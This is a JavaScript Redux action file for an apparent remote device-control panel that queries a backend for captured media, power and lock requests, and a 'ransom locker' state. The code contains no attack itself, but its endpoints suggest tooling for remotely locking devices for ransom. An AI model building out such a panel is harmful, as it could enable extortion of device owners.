import {
  RESET_CURRENT_ORDERS,
  UPDATE_STATUS,
  GET_PAST_REQUESTS,
  GET_LAST_POWER,
  GET_LAST_LOCK,
  GET_RANSOM_LOCK_STATE,
  RESET_PAST_STATE,
  GET_PAST_REQUEST_FOR_EVERY_CONTROL,
} from "./types";
import connect_control from "../../api/api";



export const reset_order_status = () => async (dispatch) => {
  try {
    dispatch({
      type: RESET_CURRENT_ORDERS,
      payload: {
        order: {},
      },
    });
  } catch (error) {
    console.log(error);
  }
};

export const update_status = (key) => async (dispatch) => {
  try {
    const res = await connect_control.post("control/status-app-update", {
      key: key,
    });

    const { status } = res.data;

    dispatch({
      type: UPDATE_STATUS,
      payload: {
        status: status,
      },
    });
  } catch (error) {
    console.log(error);
  }
};

export const get_past_requests = (key, type, one = false) => async (
  dispatch
) => {
  try {
    const res = await connect_control.get(
      "control/list-media-of-requests?key=" + key + "&type=" + type
    );

    const { requests_media } = res.data;
    if (one) {
      if (requests_media.dates.length != 0) {
        dispatch({
          type: GET_PAST_REQUESTS,
          payload: {
            past_r: requests_media.dates[0],
          },
        });
      } else {
        dispatch({
          type: GET_PAST_REQUESTS,
          payload: {
            past: "notfound",
          },
        });
      }
    } else {
      dispatch({
        type: GET_PAST_REQUESTS,
        payload: {
          past: requests_media,
        },
      });
    }
  } catch (error) {
    console.log(error);
  }
};

export const get_last_power_request = (key) => async (dispatch) => {
  try {
    const res = await connect_control.get(
      "control/last-power-request?key=" + key
    );

    const { last_power } = res.data;

    if (last_power == null) {
      dispatch({
        type: GET_LAST_POWER,
        payload: {
          last_power: 0,
        },
      });
    } else {
      dispatch({
        type: GET_LAST_POWER,
        payload: {
          last_power: last_power,
        },
      });
    }
  } catch (error) {
    console.log(error);
  }
};

export const get_last_lock_request = (key) => async (dispatch) => {
  try {
    const res = await connect_control.get(
      "control/last-lock-request?key=" + key
    );
    const { last_lock } = res.data;
    if (last_lock == null) {
      dispatch({
        type: GET_LAST_LOCK,
        payload: {
          last_lock: 0,
        },
      });
    } else {
      dispatch({
        type: GET_LAST_LOCK,
        payload: {
          last_lock: last_lock,
        },
      });
    }
  } catch (error) {
    console.log(error);
  }
};

export const get_ransom_lock_state = (key) => async (dispatch) => {
  try {
    const res = await connect_control.get(
      "control/check-ransom-locker?key=" + key
    );
    const { ransom_state } = res.data;
    if (ransom_state == null) {
      dispatch({
        type: GET_RANSOM_LOCK_STATE,
        payload: {
          ransom_lock_state: 0,
        },
      });
    } else {
      dispatch({
        type: GET_RANSOM_LOCK_STATE,
        payload: {
          ransom_lock_state: ransom_state,
        },
      });
    }
  } catch (error) {
    console.log(error);
  }
};

export const reset_params_past = () => async (dispatch) => {
  try {
    dispatch({
      type: RESET_PAST_STATE,
    });
  } catch (error) {
    console.log(error);
  }
};

export const get_one_past = (key, type) => async (dispatch) => {
  try {
    const res = await connect_control.get(
      "control/list-media-of-requests?key=" + key + "&type=" + type
    );

    const { requests_media } = res.data;

    dispatch({
      type: GET_PAST_REQUEST_FOR_EVERY_CONTROL,
      payload: {
        past: requests_media.dates[0],
      },
    });
  } catch (error) {
    console.log(error);
  }
};


